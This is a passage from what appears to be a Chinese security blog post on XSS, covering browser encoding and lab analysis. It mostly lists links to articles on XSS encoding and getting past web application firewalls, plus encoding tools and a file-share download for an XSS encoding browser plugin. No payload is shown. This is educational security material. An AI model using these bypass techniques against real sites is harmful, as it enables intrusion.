&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;Browser Security-超文本标记语言（HTML）&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.madebug.net&#x2F;static&#x2F;drops&#x2F;tips-147.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.madebug.net&#x2F;static&#x2F;drops&#x2F;tips-147.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;编码与解码-浏览器做了什么&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;xuelinf.github.io&#x2F;2016&#x2F;05&#x2F;18&#x2F;%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88&#x2F;&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;http:&#x2F;&#x2F;xuelinf.github.io&#x2F;2016&#x2F;05&#x2F;18&#x2F;编码与解码-浏览器做了什么&#x2F;&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;深入理解浏览器解析机制和XSS向量编码 文章总结&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.wjlshare.xyz&#x2F;2019&#x2F;08&#x2F;10&#x2F;%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3%e6%b5%8f%e8%a7%88%e5%99%a8%e8%a7%a3%e6%9e%90%e6%9c%ba%e5%88%b6%e5%92%8cxss%e5%90%91%e9%87%8f%e7%bc%96%e7%a0%81-%e6%96%87%e7%ab%a0%e6%80%bb%e7%bb%93&#x2F;&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.wjlshare.xyz&#x2F;2019&#x2F;08&#x2F;10&#x2F;深入理解浏览器解析机制和xss向量编码-文章总结&#x2F;&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;XSS与字符编码的那些事儿 ---科普文&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.madebug.net&#x2F;static&#x2F;drops&#x2F;tips-689.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.madebug.net&#x2F;static&#x2F;drops&#x2F;tips-689.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;XSS之绕过WAF总结&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12341190.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12341190.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
&lt;p&gt;&lt;font style&#x3D;&quot;color:rgb(35, 38, 59);&quot;&gt;推荐一些在线编码的网站：有&lt;&#x2F;font&gt;&lt;font style&#x3D;&quot;color:rgb(35, 38, 59);&quot;&gt; &lt;&#x2F;font&gt;&lt;strong&gt;&lt;font style&#x3D;&quot;color:rgb(35, 38, 59);&quot;&gt;0x_Jin&lt;&#x2F;font&gt;&lt;&#x2F;strong&gt;&lt;font style&#x3D;&quot;color:rgb(35, 38, 59);&quot;&gt; &lt;&#x2F;font&gt;&lt;font style&#x3D;&quot;color:rgb(35, 38, 59);&quot;&gt;大佬的 XSS_ENCODE 谷歌插件，解压后可用地址：&lt;&#x2F;font&gt;&lt;code&gt;**&lt;font style&#x3D;&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1JFMC1uuWq0mgUF07O8SAlQ 提取码：3rj4&lt;&#x2F;font&gt;**&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;名称&lt;&#x2F;font&gt;&lt;&#x2F;th&gt;
&lt;th align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;地址&lt;&#x2F;font&gt;&lt;&#x2F;th&gt;
&lt;&#x2F;tr&gt;
&lt;&#x2F;thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;CTF在线工具&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;ctf.ssleye.com&#x2F;&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;http:&#x2F;&#x2F;ctf.ssleye.com&#x2F;&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;HTML字符实体转换&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.qqxiuzi.cn&#x2F;bianma&#x2F;zifushiti.php&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.qqxiuzi.cn&#x2F;bianma&#x2F;zifushiti.php&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;Unicode与中文互转 16进制Unicode编码转换、还原&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.msxindl.com&#x2F;tools&#x2F;unicode16.asp&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;http:&#x2F;&#x2F;www.msxindl.com&#x2F;tools&#x2F;unicode16.asp&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;Unicode 编码&amp;解码&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.css-js.com&#x2F;tools&#x2F;unicode.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.css-js.com&#x2F;tools&#x2F;unicode.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;saucer-man.com&#x2F;information_security&#x2F;103.html&quot;&gt;探索XSS利用编码绕过的原理 - yanq的个人博客&lt;&#x2F;a&gt; （强推！很不错）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunen&#x2F;p&#x2F;13561433.html&quot;&gt;以浏览器解析机制来理解XSS载荷的编码转换 - Yunen的博客 - 博客园&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-9"><span class="toc-number">6.0.1.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-%E8%BD%AC%E5%8C%96%E5%A4%A7%E5%86%99-%E8%BF%87%E6%BB%A4script"><span class="toc-number">6.1.</span> <span class="toc-text">0x0C  转化大写+过滤script</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-11"><span class="toc-number">6.1.1.</span> <span class="toc-text">Server Code</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/11/MCP-%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/" title="MCP安全初探">MCP安全初探</a><time datetime="2025-06-11T13:42:16.000Z" title="发表于 2025-06-11 21:42:16">2025-06-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%912025.5.26%20Github-MCP%20%E9%9A%90%E7%A7%81%E4%BB%93%E5%BA%93%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E7%AA%83%E5%8F%96/" title="【漏洞复现】2025.5.26 Github-MCP 隐私仓库个人信息窃取">【漏洞复现】2025.5.26 Github-MCP 隐私仓库个人信息窃取</a><time datetime="2025-05-29T06:32:12.000Z" title="发表于 2025-05-29 14:32:12">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/28/%E5%AD%98%E5%82%A8%E6%A1%B6%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/" title="存储桶漏洞浅析">存储桶漏洞浅析</a><time datetime="2025-05-28T11:04:23.000Z" title="发表于 2025-05-28 19:04:23">2025-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/25/MCP%20%E5%AD%A6%E4%B9%A0/" title="MCP入门">MCP入门</a><time datetime="2025-05-25T09:42:32.000Z" title="发表于 2025-05-25 17:42:32">2025-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/08/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="XSS-从浏览器编解码到靶场分析">XSS-从浏览器编解码到靶场分析</a><time datetime="2025-05-08T15:24:41.000Z" title="发表于 2025-05-08 23:24:41">2025-05-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Drblack</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>